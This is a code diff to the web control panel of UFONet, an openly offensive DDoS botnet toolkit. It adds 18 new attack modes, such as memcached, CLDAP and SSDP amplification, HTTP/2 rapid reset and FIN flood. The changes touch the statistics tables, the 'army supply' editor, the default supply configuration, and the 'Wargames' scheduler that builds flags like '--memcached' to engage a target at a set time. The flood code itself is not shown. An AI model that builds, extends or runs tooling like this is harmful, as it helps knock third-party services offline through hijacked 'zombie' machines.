@@ -3,7 +3,7 @@
 """
 This file is part of the UFONet project, https://ufonet.03c8.net
 
-Copyright (c) 2013/2024 | psy <epsylon@riseup.net>
+Copyright (c) 2013/2026 | psy <epsylon@riseup.net>
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
@@ -16,6 +16,7 @@ python_version = "python"+platform.python_version_tuple()[0]+"."+platform.python
 
 import socket, threading, re, os, time, random, base64
 import webbrowser, subprocess, json, sys, requests
+_AJAX_MAP_CACHE = None
 import urllib.request, urllib.error, urllib.parse
 from urllib.parse import urlparse as urlparse
 from core.tools.crypter import Cipher
@@ -34,11 +35,11 @@ crypto_key = "U-NATi0n!" # default enc/dec (+moderator board) key #
 ###################################################################
 
 browser_init_page = "https://swisscows.com/en" # initial webpage for ship.browser [OK! 20/08/2024]
-check_ip_service1 = 'https://checkip.org/' # set external check ip service 1 [OK! 23/07/2022][OK! 20/08/2024]
-check_ip_service2 = 'https://whatismyip.org/' # set external check ip service 2 [OK! 06/06/2020][OK! 20/08/2024]
-check_ip_service3 = 'https://ip.42.pl/ra' # set external check ip service 3 [OK! [23/07/2022][OK! 20/08/2024]
+check_ip_service1 = 'https://api.ipify.org'
+check_ip_service2 = 'https://icanhazip.com'
+check_ip_service3 = 'https://ifconfig.me/ip'
 
-torrent_seed = "https://ufonet.03c8.net/ufonet/ufonet-v1.9.tar.gz.torrent" # current torrent seed [OK! 21/08/2024]
+torrent_seed = "https://ufonet.03c8.net/ufonet/ufonet-v2.0.tar.gz.torrent" # current torrent seed [OK! 20/05/2026]
 
 blackhole_sep = "|" # blackhole stream separator
 board_msg_sep = "#!#" # board stream separator
@@ -91,7 +92,8 @@ class Pages():
         except:
             target_js="not any zombie available\n\n"
         if target is not None:
-            target_js += "$('#ufomsg').load('/js/ajax.js?doll="+target+"')\n"
+            target_js += "doll = new Doll('"+target+"')\n"
+            target_js += "$('#ufomsg').load('/js/ajax.js?fetchdoll="+target+"')\n"
         return self.pages["/header"] + """
   <link rel="stylesheet" href="/js/style.css" />
   <link rel="stylesheet" href="/js/ajaxmap.css" />
@@ -380,7 +382,7 @@ window.setTimeout(window.close,1234)
 <center>Grid profile updated. Re-enter to see changes..."""+self.pages["/footer"]
 
     def html_stats(self):
-        total_extra_attacks = int(self.aloic) + int(self.aloris) + int(self.aufosyn) + int(self.aspray) + int(self.asmurf) + int(self.axmas) + int(self.anuke) + int(self.atachyon) + int(self.amonlist) + int(self.afraggle) + int(self.asniper) + int(self.aufoack) + int(self.auforst) + int(self.adroper) + int(self.aoverlap) + int(self.apinger) + int(self.aufoudp)
+        total_extra_attacks = int(self.aloic) + int(self.aloris) + int(self.aufosyn) + int(self.aspray) + int(self.asmurf) + int(self.axmas) + int(self.anuke) + int(self.atachyon) + int(self.amonlist) + int(self.afraggle) + int(self.asniper) + int(self.aufoack) + int(self.auforst) + int(self.adroper) + int(self.aoverlap) + int(self.apinger) + int(self.aufoudp) + int(self.amemcached) + int(self.achargen) + int(self.acldap) + int(self.assdp) + int(self.aqotd) + int(self.atftp) + int(self.awsdisco) + int(self.acoap) + int(self.amssql) + int(self.aarms) + int(self.aplex) + int(self.anetbios) + int(self.aripv1) + int(self.amiddlebox) + int(self.arapidreset) + int(self.aslowread) + int(self.agoldeneye) + int(self.afinflood)
         if self.ranking == "Rookie": # Rookie
             your_ranking = "<font color='white'>Rookie [*]</font>"
         elif self.ranking == "Mercenary": # Mercenary
@@ -490,6 +492,30 @@ function Streams() {
 <tr>
 <td>PINGER:</td><td align='right'><font color='cyan'>""" + str(self.apinger) + """</font></td>
 <td>UFOUDP:</td><td align='right'><font color='cyan'>""" + str(self.aufoudp) + """</font></td>
+<td>MEMCACHED:</td><td align='right'><font color='cyan'>""" + str(self.amemcached) + """</font></td></tr>
+<tr>
+<td>CHARGEN:</td><td align='right'><font color='cyan'>""" + str(self.achargen) + """</font></td>
+<td>CLDAP:</td><td align='right'><font color='cyan'>""" + str(self.acldap) + """</font></td>
+<td>SSDP:</td><td align='right'><font color='cyan'>""" + str(self.assdp) + """</font></td></tr>
+<tr>
+<td>QOTD:</td><td align='right'><font color='cyan'>""" + str(self.aqotd) + """</font></td>
+<td>TFTP:</td><td align='right'><font color='cyan'>""" + str(self.atftp) + """</font></td>
+<td>WSDISCO:</td><td align='right'><font color='cyan'>""" + str(self.awsdisco) + """</font></td></tr>
+<tr>
+<td>COAP:</td><td align='right'><font color='cyan'>""" + str(self.acoap) + """</font></td>
+<td>MSSQL:</td><td align='right'><font color='cyan'>""" + str(self.amssql) + """</font></td>
+<td>ARMS:</td><td align='right'><font color='cyan'>""" + str(self.aarms) + """</font></td></tr>
+<tr>
+<td>PLEX:</td><td align='right'><font color='cyan'>""" + str(self.aplex) + """</font></td>
+<td>NETBIOS:</td><td align='right'><font color='cyan'>""" + str(self.anetbios) + """</font></td>
+<td>RIPV1:</td><td align='right'><font color='cyan'>""" + str(self.aripv1) + """</font></td></tr>
+<tr>
+<td>MIDDLEBOX:</td><td align='right'><font color='cyan'>""" + str(self.amiddlebox) + """</font></td>
+<td>RAPIDRESET:</td><td align='right'><font color='cyan'>""" + str(self.arapidreset) + """</font></td>
+<td>SLOWREAD:</td><td align='right'><font color='cyan'>""" + str(self.aslowread) + """</font></td></tr>
+<tr>
+<td>GOLDENEYE:</td><td align='right'><font color='cyan'>""" + str(self.agoldeneye) + """</font></td>
+<td>FINFLOOD:</td><td align='right'><font color='cyan'>""" + str(self.afinflood) + """</font></td>
 <td>TOTAL:</td><td align='right'><font color='red'>""" + str(total_extra_attacks) +"""</font></td>
 </tr>
 </table>
@@ -887,7 +913,7 @@ function SendMessage() {
             f.close()
             mothership_members = 0 # mothership_members stats bonus
             unknown_members = 0 # unknown (or non decrypted) mothership members
-            grid_table = "<center><u>MEMBERS STATS:</u></center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><u>NICKNAME:</u></td><td align='center'><u>RANK:</u></td><td align='center'><u>CHARGO:</u></td><td align='center'><u>DORKING:</u></td><td align='center'><u>TRANSF:</u></td><td align='center'><u>MAX.CHARGO:</u></td><td align='center'><u>MISSIONS:</u></td><td align='center'><u>ATTACKS:</u></td><td align='center'><u>LOIC:</u></td><td align='center'><u>LORIS:</u></td><td align='center'><u>UFOSYN:</u></td><td align='center'><u>SPRAY:</u></td><td align='center'><u>SMURF:</u></td><td align='center'><u>XMAS:</u></td><td align='center'><u>NUKE:</u></td><td align='center'><u>TACHYON:</u></td><td align='center'><u>MONLIST:</u></td><td align='center'><u>FRAGGLE:</u></td><td align='center'><u>SNIPER:</u></td><td align='center'><u>UFOACK:</u></td><td align='center'><u>UFORST:</u></td><td align='center'><u>DROPER:</u></td><td align='center'><u>OVERLAP:</u></td><td align='center'><u>PINGER:</u></td><td align='center'><u>UFOUDP:</u></td><td align='center'><u>CONTACT:</u></td></tr>"
+            grid_table = "<center><u>MEMBERS STATS:</u></center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><u>NICKNAME:</u></td><td align='center'><u>RANK:</u></td><td align='center'><u>CHARGO:</u></td><td align='center'><u>DORKING:</u></td><td align='center'><u>TRANSF:</u></td><td align='center'><u>MAX.CHARGO:</u></td><td align='center'><u>MISSIONS:</u></td><td align='center'><u>ATTACKS:</u></td><td align='center'><u>LOIC:</u></td><td align='center'><u>LORIS:</u></td><td align='center'><u>UFOSYN:</u></td><td align='center'><u>SPRAY:</u></td><td align='center'><u>SMURF:</u></td><td align='center'><u>XMAS:</u></td><td align='center'><u>NUKE:</u></td><td align='center'><u>TACHYON:</u></td><td align='center'><u>MONLIST:</u></td><td align='center'><u>FRAGGLE:</u></td><td align='center'><u>SNIPER:</u></td><td align='center'><u>UFOACK:</u></td><td align='center'><u>UFORST:</u></td><td align='center'><u>DROPER:</u></td><td align='center'><u>OVERLAP:</u></td><td align='center'><u>PINGER:</u></td><td align='center'><u>UFOUDP:</u></td><td align='center'><u>MEMCACHED:</u></td><td align='center'><u>CHARGEN:</u></td><td align='center'><u>CLDAP:</u></td><td align='center'><u>SSDP:</u></td><td align='center'><u>QOTD:</u></td><td align='center'><u>TFTP:</u></td><td align='center'><u>WSDISCO:</u></td><td align='center'><u>COAP:</u></td><td align='center'><u>MSSQL:</u></td><td align='center'><u>ARMS:</u></td><td align='center'><u>PLEX:</u></td><td align='center'><u>NETBIOS:</u></td><td align='center'><u>RIPV1:</u></td><td align='center'><u>MIDDLEBOX:</u></td><td align='center'><u>SLOWREAD:</u></td><td align='center'><u>GOLDENEYE:</u></td><td align='center'><u>RAPIDRESET:</u></td><td align='center'><u>FINFLOOD:</u></td><td align='center'><u>CONTACT:</u></td></tr>"
             for m in self.list_grid: # msg = nickname, ranking, chargo, dorking, transf, maxchargo, missions, attacks, loic, loris, ufosyn, spray, smurf, xmas, nuke, tachyon, monlist, fraggle, sniper, ufoack, uforst, droper, overlap, pinger, ufoudp, contact, ID
                 if grid_msg_sep in m:
                     version = m.count(grid_msg_sep) # check UFONet stream version (made for compatibility with old motherships)
@@ -911,6 +937,10 @@ function SendMessage() {
                     grid_attacks = ''.join(random.sample(grid_attacks,len(grid_attacks))) # attacks (obfuscation)
                     grid_loic = m[8][0:4] # loic
                     grid_loic = ''.join(random.sample(grid_loic,len(grid_loic))) # loic (obfuscation)
+                    _new_mod_names = ['memcached','chargen','cldap','ssdp','qotd','tftp','wsdisco','coap','mssql','arms','plex','netbios','ripv1','middlebox','slowread','goldeneye','rapidreset','finflood']
+                    _np = "2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q=="[0:4]
+                    _np = ''.join(random.sample(_np,len(_np)))
+                    grid_memcached = grid_chargen = grid_cldap = grid_ssdp = grid_qotd = grid_tftp = grid_wsdisco = grid_coap = grid_mssql = grid_arms = grid_plex = grid_netbios = grid_ripv1 = grid_middlebox = grid_slowread = grid_goldeneye = grid_rapidreset = grid_finflood = _np
                     if version > 18: # v1.5
                         grid_loris = m[9][0:4] # loris
                         grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
@@ -944,14 +974,48 @@ function SendMessage() {
                         grid_pinger = ''.join(random.sample(grid_pinger,len(grid_pinger))) # pinger (obfuscation)
                         grid_ufoudp =  m[24][0:4] # ufoudp
                         grid_ufoudp = ''.join(random.sample(grid_ufoudp,len(grid_ufoudp))) # ufoudp (obfuscation)
-                        try:
-                            grid_contact = "<a href=javascript:alert('"+str(m[25][0:12])+"');>View</a>" # js contact view (obfuscation)
-                        except:
-                            grid_contact= "invalid"
-                        try:
-                            grid_id = m[26] # id (plain id)
-                        except:
-                            grid_id = "invalid!"
+                        if version > 26: # v2.0+: 18 extra mods at positions 25..42, contact at 43, id at 44
+                            for _i, _name in enumerate(_new_mod_names):
+                                try:
+                                    _v = m[25 + _i][0:4]
+                                    _v = ''.join(random.sample(_v,len(_v)))
+                                except Exception:
+                                    _v = _np
+                                if _name == 'memcached':   grid_memcached = _v
+                                elif _name == 'chargen':   grid_chargen = _v
+                                elif _name == 'cldap':     grid_cldap = _v
+                                elif _name == 'ssdp':      grid_ssdp = _v
+                                elif _name == 'qotd':      grid_qotd = _v
+                                elif _name == 'tftp':      grid_tftp = _v
+                                elif _name == 'wsdisco':   grid_wsdisco = _v
+                                elif _name == 'coap':      grid_coap = _v
+                                elif _name == 'mssql':     grid_mssql = _v
+                                elif _name == 'arms':      grid_arms = _v
+                                elif _name == 'plex':      grid_plex = _v
+                                elif _name == 'netbios':   grid_netbios = _v
+                                elif _name == 'ripv1':     grid_ripv1 = _v
+                                elif _name == 'middlebox': grid_middlebox = _v
+                                elif _name == 'slowread':  grid_slowread = _v
+                                elif _name == 'goldeneye': grid_goldeneye = _v
+                                elif _name == 'rapidreset':grid_rapidreset = _v
+                                elif _name == 'finflood':  grid_finflood = _v
+                            try:
+                                grid_contact = "<a href=javascript:alert('"+str(m[43][0:12])+"');>View</a>"
+                            except:
+                                grid_contact = "invalid"
+                            try:
+                                grid_id = m[44]
+                            except:
+                                grid_id = "invalid!"
+                        else:
+                            try:
+                                grid_contact = "<a href=javascript:alert('"+str(m[25][0:12])+"');>View</a>" # js contact view (obfuscation)
+                            except:
+                                grid_contact= "invalid"
+                            try:
+                                grid_id = m[26] # id (plain id)
+                            except:
+                                grid_id = "invalid!"
                     if version == 18: # v1.4
                         grid_loris = m[9][0:4] # loris
                         grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
@@ -1232,7 +1296,7 @@ function SendMessage() {
                             grid_id = "invalid!"
                     else: # no valid version
                         pass
-                    grid_table += "<tr><td align='center'>"+str(grid_nickname)+"</td><td align='center'>"+str(grid_ranking)+"</td><td align='center'>"+str(grid_totalchargo)+"</td><td align='center'>"+str(grid_dorking)+"</td><td align='center'>"+str(grid_transferred)+"</td><td align='center'>"+str(grid_maxchargo)+"</td><td align='center'>"+str(grid_missions)+"</td><td align='center'>"+str(grid_attacks)+"</td><td align='center'>"+str(grid_loic)+"</td><td align='center'>"+str(grid_loris)+"</td><td align='center'>"+str(grid_ufosyn)+"</td><td align='center'>"+str(grid_spray)+"</td><td align='center'>"+str(grid_smurf)+"</td><td align='center'>"+str(grid_xmas)+"</td><td align='center'>"+str(grid_nuke)+"</td><td align='center'>"+str(grid_tachyon)+"</td><td align='center'>"+str(grid_monlist)+"</td><td align='center'>"+str(grid_fraggle)+"</td><td align='center'>"+str(grid_sniper)+"</td><td align='center'>"+str(grid_ufoack)+"</td><td align='center'>"+str(grid_uforst)+"</td><td align='center'>"+str(grid_droper)+"</td><td align='center'>"+str(grid_overlap)+"</td><td align='center'>"+str(grid_pinger)+"</td><td align='center'>"+str(grid_ufoudp)+"</td><td align='center'>"+str(grid_contact)+"</td></tr>"
+                    grid_table += "<tr><td align='center'>"+str(grid_nickname)+"</td><td align='center'>"+str(grid_ranking)+"</td><td align='center'>"+str(grid_totalchargo)+"</td><td align='center'>"+str(grid_dorking)+"</td><td align='center'>"+str(grid_transferred)+"</td><td align='center'>"+str(grid_maxchargo)+"</td><td align='center'>"+str(grid_missions)+"</td><td align='center'>"+str(grid_attacks)+"</td><td align='center'>"+str(grid_loic)+"</td><td align='center'>"+str(grid_loris)+"</td><td align='center'>"+str(grid_ufosyn)+"</td><td align='center'>"+str(grid_spray)+"</td><td align='center'>"+str(grid_smurf)+"</td><td align='center'>"+str(grid_xmas)+"</td><td align='center'>"+str(grid_nuke)+"</td><td align='center'>"+str(grid_tachyon)+"</td><td align='center'>"+str(grid_monlist)+"</td><td align='center'>"+str(grid_fraggle)+"</td><td align='center'>"+str(grid_sniper)+"</td><td align='center'>"+str(grid_ufoack)+"</td><td align='center'>"+str(grid_uforst)+"</td><td align='center'>"+str(grid_droper)+"</td><td align='center'>"+str(grid_overlap)+"</td><td align='center'>"+str(grid_pinger)+"</td><td align='center'>"+str(grid_ufoudp)+"</td><td align='center'>"+str(grid_memcached)+"</td><td align='center'>"+str(grid_chargen)+"</td><td align='center'>"+str(grid_cldap)+"</td><td align='center'>"+str(grid_ssdp)+"</td><td align='center'>"+str(grid_qotd)+"</td><td align='center'>"+str(grid_tftp)+"</td><td align='center'>"+str(grid_wsdisco)+"</td><td align='center'>"+str(grid_coap)+"</td><td align='center'>"+str(grid_mssql)+"</td><td align='center'>"+str(grid_arms)+"</td><td align='center'>"+str(grid_plex)+"</td><td align='center'>"+str(grid_netbios)+"</td><td align='center'>"+str(grid_ripv1)+"</td><td align='center'>"+str(grid_middlebox)+"</td><td align='center'>"+str(grid_slowread)+"</td><td align='center'>"+str(grid_goldeneye)+"</td><td align='center'>"+str(grid_rapidreset)+"</td><td align='center'>"+str(grid_finflood)+"</td><td align='center'>"+str(grid_contact)+"</td></tr>"
                 else: # not valid stream data
                     pass
             grid_table += "</table>"
@@ -1241,7 +1305,7 @@ function SendMessage() {
             if unknown_members == 0:
                 unknown_members = "¿?"
             l = time.ctime(os.path.getmtime(self.grid_file)) # get last modified time
-            mother_grid = "<div id='grid_panel_enc' style='display:block'><br><center><u>MOTHERSHIP STATS:</u> (Last Update: <font color='green'>"+str(l)+"</font>)</center><br><table cellpadding='5' cellspacing='5' border='1' align='middle'><tr><td><font color='green'>MEMBERS:</font></td><td align='right'><font color='green'>"+str(mothership_members)+"</font></td><td><font color='orange' size='4'>-</font></td><td><font color='orange'>"+str(unknown_members)+"</font></td><td><font color='white' size='4'>*</font></td><td><font color='white'>¿?</font></td><td><font color='cyan' size='4'>**</font></td><td><font color='cyan'>¿?</font></td><td><font color='blueviolet' size='4'>***</font></td><td><font color='blueviolet'>¿?</font></td><td><font color='blue' size='4'>****</font></td><td><font color='blue'>¿?</font></td><td><font color='red' size='4'>&#x25BC;</font></td><td><font color='red'>¿?</font></td></tr></table><br><table cellpadding='5' cellspacing='5' border='1' align='middle'><tr><tr><td>MISSIONS:</td><td>¿?</td><td>ATTACKS:</td><td>¿?</td><td>CHARGO (ACTIVE!):</td><td>¿?</td><td>DORKING:</td><td>¿?</td><td>TRANSF:</td><td>¿?</td><td>MAX.CHARGO:</td><td>¿?</td></tr></table><br><table cellpadding='5' cellspacing='5' border='1' align='middle'><tr><td>LOIC:</td><td>¿?</td><td>LORIS:</td><td>¿?</td><td>UFOSYN:</td><td>¿?</td><td>SPRAY:</td><td>¿?</td><td>SMURF:</td><td>¿?</td></tr><tr><td>XMAS:</td><td>¿?</td><td>NUKE:</td><td>¿?</td><td>TACHYON:</td><td>¿?</td><td>MONLIST:</td><td>¿?</td></tr><tr><td>FRAGGLE:</td><td>¿?</td><td>SNIPER:</td><td>¿?</td><td>UFOACK:</td><td>¿?</td><td>UFORST:</td><td>¿?</td></tr><tr><td>DROPER:</td><td>¿?</td><td>OVERLAP:</td><td>¿?</td><td>PINGER:</td><td>¿?</td><td>UFOUDP:</td><td>¿?</td></tr></table><br><hr><br>"
+            mother_grid = "<div id='grid_panel_enc' style='display:block'><br><center><u>MOTHERSHIP STATS:</u> (Last Update: <font color='green'>"+str(l)+"</font>)</center><br><table cellpadding='5' cellspacing='5' border='1' align='middle'><tr><td><font color='green'>MEMBERS:</font></td><td align='right'><font color='green'>"+str(mothership_members)+"</font></td><td><font color='orange' size='4'>-</font></td><td><font color='orange'>"+str(unknown_members)+"</font></td><td><font color='white' size='4'>*</font></td><td><font color='white'>¿?</font></td><td><font color='cyan' size='4'>**</font></td><td><font color='cyan'>¿?</font></td><td><font color='blueviolet' size='4'>***</font></td><td><font color='blueviolet'>¿?</font></td><td><font color='blue' size='4'>****</font></td><td><font color='blue'>¿?</font></td><td><font color='red' size='4'>&#x25BC;</font></td><td><font color='red'>¿?</font></td></tr></table><br><table cellpadding='5' cellspacing='5' border='1' align='middle'><tr><tr><td>MISSIONS:</td><td>¿?</td><td>ATTACKS:</td><td>¿?</td><td>CHARGO (ACTIVE!):</td><td>¿?</td><td>DORKING:</td><td>¿?</td><td>TRANSF:</td><td>¿?</td><td>MAX.CHARGO:</td><td>¿?</td></tr></table><br><table cellpadding='5' cellspacing='5' border='1' align='middle'><tr><td>LOIC:</td><td>¿?</td><td>LORIS:</td><td>¿?</td><td>UFOSYN:</td><td>¿?</td><td>SPRAY:</td><td>¿?</td><td>SMURF:</td><td>¿?</td></tr><tr><td>XMAS:</td><td>¿?</td><td>NUKE:</td><td>¿?</td><td>TACHYON:</td><td>¿?</td><td>MONLIST:</td><td>¿?</td></tr><tr><td>FRAGGLE:</td><td>¿?</td><td>SNIPER:</td><td>¿?</td><td>UFOACK:</td><td>¿?</td><td>UFORST:</td><td>¿?</td></tr><tr><td>DROPER:</td><td>¿?</td><td>OVERLAP:</td><td>¿?</td><td>PINGER:</td><td>¿?</td><td>UFOUDP:</td><td>¿?</td></tr><tr><td>MEMCACHED:</td><td>¿?</td><td>CHARGEN:</td><td>¿?</td><td>CLDAP:</td><td>¿?</td><td>SSDP:</td><td>¿?</td></tr><tr><td>QOTD:</td><td>¿?</td><td>TFTP:</td><td>¿?</td><td>WSDISCO:</td><td>¿?</td><td>COAP:</td><td>¿?</td></tr><tr><td>MSSQL:</td><td>¿?</td><td>ARMS:</td><td>¿?</td><td>PLEX:</td><td>¿?</td><td>NETBIOS:</td><td>¿?</td></tr><tr><td>RIPV1:</td><td>¿?</td><td>MIDDLEBOX:</td><td>¿?</td><td>SLOWREAD:</td><td>¿?</td><td>GOLDENEYE:</td><td>¿?</td></tr><tr><td>RAPIDRESET:</td><td>¿?</td><td>FINFLOOD:</td><td>¿?</td></tr></table><br><hr><br>"
             grid_table = mother_grid + grid_table + "</div>"
             return grid_table
 
@@ -1486,6 +1550,24 @@ function EditSupply(){
           document.getElementById("supply_botnet").readOnly = false;
           document.getElementById("supply_loic").readOnly = false;
           document.getElementById("supply_loris").readOnly = false;
+          document.getElementById("supply_memcached").readOnly = false;
+          document.getElementById("supply_chargen").readOnly = false;
+          document.getElementById("supply_cldap").readOnly = false;
+          document.getElementById("supply_ssdp").readOnly = false;
+          document.getElementById("supply_qotd").readOnly = false;
+          document.getElementById("supply_tftp").readOnly = false;
+          document.getElementById("supply_wsdisco").readOnly = false;
+          document.getElementById("supply_coap").readOnly = false;
+          document.getElementById("supply_mssql").readOnly = false;
+          document.getElementById("supply_arms").readOnly = false;
+          document.getElementById("supply_plex").readOnly = false;
+          document.getElementById("supply_netbios").readOnly = false;
+          document.getElementById("supply_ripv1").readOnly = false;
+          document.getElementById("supply_middlebox").readOnly = false;
+          document.getElementById("supply_rapidreset").readOnly = false;
+          document.getElementById("supply_slowread").readOnly = false;
+          document.getElementById("supply_goldeneye").readOnly = false;
+          document.getElementById("supply_finflood").readOnly = false;
           document.getElementById("supply_ufosyn").readOnly = false;
           document.getElementById("supply_spray").readOnly = false;
           document.getElementById("supply_smurf").readOnly = false;
@@ -1508,6 +1590,24 @@ function EditSupply(){
           supply_botnet=document.getElementById("supply_botnet").value
           supply_loic=document.getElementById("supply_loic").value
           supply_loris=document.getElementById("supply_loris").value
+          supply_memcached=document.getElementById("supply_memcached").value
+          supply_chargen=document.getElementById("supply_chargen").value
+          supply_cldap=document.getElementById("supply_cldap").value
+          supply_ssdp=document.getElementById("supply_ssdp").value
+          supply_qotd=document.getElementById("supply_qotd").value
+          supply_tftp=document.getElementById("supply_tftp").value
+          supply_wsdisco=document.getElementById("supply_wsdisco").value
+          supply_coap=document.getElementById("supply_coap").value
+          supply_mssql=document.getElementById("supply_mssql").value
+          supply_arms=document.getElementById("supply_arms").value
+          supply_plex=document.getElementById("supply_plex").value
+          supply_netbios=document.getElementById("supply_netbios").value
+          supply_ripv1=document.getElementById("supply_ripv1").value
+          supply_middlebox=document.getElementById("supply_middlebox").value
+          supply_rapidreset=document.getElementById("supply_rapidreset").value
+          supply_slowread=document.getElementById("supply_slowread").value
+          supply_goldeneye=document.getElementById("supply_goldeneye").value
+          supply_finflood=document.getElementById("supply_finflood").value
           supply_ufosyn=document.getElementById("supply_ufosyn").value
           supply_spray=document.getElementById("supply_spray").value
           supply_smurf=document.getElementById("supply_smurf").value
@@ -1598,6 +1698,24 @@ function EditSupply(){
 	                document.getElementById("supply_botnet").readOnly = true;
           	        document.getElementById("supply_loic").readOnly = true;
 	                document.getElementById("supply_loris").readOnly = true;
+	                document.getElementById("supply_memcached").readOnly = true;
+	                document.getElementById("supply_chargen").readOnly = true;
+	                document.getElementById("supply_cldap").readOnly = true;
+	                document.getElementById("supply_ssdp").readOnly = true;
+	                document.getElementById("supply_qotd").readOnly = true;
+	                document.getElementById("supply_tftp").readOnly = true;
+	                document.getElementById("supply_wsdisco").readOnly = true;
+	                document.getElementById("supply_coap").readOnly = true;
+	                document.getElementById("supply_mssql").readOnly = true;
+	                document.getElementById("supply_arms").readOnly = true;
+	                document.getElementById("supply_plex").readOnly = true;
+	                document.getElementById("supply_netbios").readOnly = true;
+	                document.getElementById("supply_ripv1").readOnly = true;
+	                document.getElementById("supply_middlebox").readOnly = true;
+	                document.getElementById("supply_rapidreset").readOnly = true;
+	                document.getElementById("supply_slowread").readOnly = true;
+	                document.getElementById("supply_goldeneye").readOnly = true;
+	                document.getElementById("supply_finflood").readOnly = true;
 	                document.getElementById("supply_ufosyn").readOnly = true;
                         document.getElementById("supply_spray").readOnly = true;
                         document.getElementById("supply_smurf").readOnly = true;
@@ -1616,7 +1734,7 @@ function EditSupply(){
 	                document.getElementById("supply_edit").title = "Edit global army supply..."
 	                document.getElementById("supply_edit").value = "EDIT"
 	                document.getElementById("supply_edit").innerHTML = "EDIT"
-                    params="botnet="+escape(supply_botnet)+"&loic="+escape(supply_loic)+"&loris="+escape(supply_loris)+"&ufosyn="+escape(supply_ufosyn)+"&spray="+escape(supply_spray)+"&smurf="+escape(supply_smurf)+"&xmas="+escape(supply_xmas)+"&nuke="+escape(supply_nuke)+"&tachyon="+escape(supply_tachyon)+"&monlist="+escape(supply_monlist)+"&fraggle="+escape(supply_fraggle)+"&sniper="+escape(supply_sniper)+"&ufoack="+escape(supply_ufoack)+"&uforst="+escape(supply_uforst)+"&droper="+escape(supply_droper)+"&overlap="+escape(supply_overlap)+"&pinger="+escape(supply_pinger)+"&ufoudp="+escape(supply_ufoudp)
+                    params="botnet="+escape(supply_botnet)+"&loic="+escape(supply_loic)+"&loris="+escape(supply_loris)+"&ufosyn="+escape(supply_ufosyn)+"&spray="+escape(supply_spray)+"&smurf="+escape(supply_smurf)+"&xmas="+escape(supply_xmas)+"&nuke="+escape(supply_nuke)+"&tachyon="+escape(supply_tachyon)+"&monlist="+escape(supply_monlist)+"&fraggle="+escape(supply_fraggle)+"&sniper="+escape(supply_sniper)+"&ufoack="+escape(supply_ufoack)+"&uforst="+escape(supply_uforst)+"&droper="+escape(supply_droper)+"&overlap="+escape(supply_overlap)+"&pinger="+escape(supply_pinger)+"&ufoudp="+escape(supply_ufoudp)+"&memcached="+escape(supply_memcached)+"&chargen="+escape(supply_chargen)+"&cldap="+escape(supply_cldap)+"&ssdp="+escape(supply_ssdp)+"&qotd="+escape(supply_qotd)+"&tftp="+escape(supply_tftp)+"&wsdisco="+escape(supply_wsdisco)+"&coap="+escape(supply_coap)+"&mssql="+escape(supply_mssql)+"&arms="+escape(supply_arms)+"&plex="+escape(supply_plex)+"&netbios="+escape(supply_netbios)+"&ripv1="+escape(supply_ripv1)+"&middlebox="+escape(supply_middlebox)+"&rapidreset="+escape(supply_rapidreset)+"&slowread="+escape(supply_slowread)+"&goldeneye="+escape(supply_goldeneye)+"&finflood="+escape(supply_finflood)
                     runCommandX("cmd_edit_supply",params)
                     setTimeout("Decrypt_wargames()", 2000)
                              }
@@ -2345,7 +2463,7 @@ Last update: <font color='"""+ self.blackholes_status_color + """'>"""+ self.bla
                     except:
                         print('[Info] [AI] Cannot found: "core/json/supplycfg.json" -> [Generating!]')
                         with open(self.mothership_supplycfg_file, "w") as f:
-                            json.dump({"botnet": 1, "loic": 0, "loris": 0, "ufosyn": 0, "spray": 0, "smurf": 0, "xmas": 0, "nuke": 0, "tachyon": 0, "monlist": 0, "fraggle": 0, "sniper": 0, "ufoack": 0, "uforst": 0, "droper": 0, "overlap": 0, "pinger": 0, "ufoudp": 0}, f, indent=4)
+                            json.dump({"botnet": 1, "loic": 0, "loris": 0, "ufosyn": 0, "spray": 0, "smurf": 0, "xmas": 0, "nuke": 0, "tachyon": 0, "monlist": 0, "fraggle": 0, "sniper": 0, "ufoack": 0, "uforst": 0, "droper": 0, "overlap": 0, "pinger": 0, "ufoudp": 0, "memcached": 0, "chargen": 0, "cldap": 0, "ssdp": 0, "qotd": 0, "tftp": 0, "wsdisco": 0, "coap": 0, "mssql": 0, "arms": 0, "plex": 0, "netbios": 0, "ripv1": 0, "middlebox": 0, "rapidreset": 0, "slowread": 0, "goldeneye": 0, "finflood": 0}, f, indent=4)
                     with open(self.mothership_supplycfg_file) as data_file:
                         data = json.load(data_file)
                     self.supply_botnet = data["botnet"]
@@ -2366,6 +2484,24 @@ Last update: <font color='"""+ self.blackholes_status_color + """'>"""+ self.bla
                     self.supply_overlap = data["overlap"]
                     self.supply_pinger = data["pinger"]
                     self.supply_ufoudp = data["ufoudp"]
+                    self.supply_memcached = data.get("memcached", 0)
+                    self.supply_chargen = data.get("chargen", 0)
+                    self.supply_cldap = data.get("cldap", 0)
+                    self.supply_ssdp = data.get("ssdp", 0)
+                    self.supply_qotd = data.get("qotd", 0)
+                    self.supply_tftp = data.get("tftp", 0)
+                    self.supply_wsdisco = data.get("wsdisco", 0)
+                    self.supply_coap = data.get("coap", 0)
+                    self.supply_mssql = data.get("mssql", 0)
+                    self.supply_arms = data.get("arms", 0)
+                    self.supply_plex = data.get("plex", 0)
+                    self.supply_netbios = data.get("netbios", 0)
+                    self.supply_ripv1 = data.get("ripv1", 0)
+                    self.supply_middlebox = data.get("middlebox", 0)
+                    self.supply_rapidreset = data.get("rapidreset", 0)
+                    self.supply_slowread = data.get("slowread", 0)
+                    self.supply_goldeneye = data.get("goldeneye", 0)
+                    self.supply_finflood = data.get("finflood", 0)
                     job_estimated_dec = strftime("%d-%m-%Y %H:%M:%S", job_estimated_dec)
                     print("[Info] [Wargames] Time is over: [" + str(job_estimated_dec) + "] -> Engaging target: " + str(job_target_dec))
                     cmd = ""
@@ -2420,6 +2556,42 @@ Last update: <font color='"""+ self.blackholes_status_color + """'>"""+ self.bla
                         cmd += "--loris " +str(self.supply_loris)+ " "
                     if int(self.supply_loic) > 0:
                         cmd += "--loic " +str(self.supply_loic)+ " "
+                    if int(self.supply_memcached) > 0:
+                        cmd += "--memcached " +str(self.supply_memcached)+ " "
+                    if int(self.supply_chargen) > 0:
+                        cmd += "--chargen " +str(self.supply_chargen)+ " "
+                    if int(self.supply_cldap) > 0:
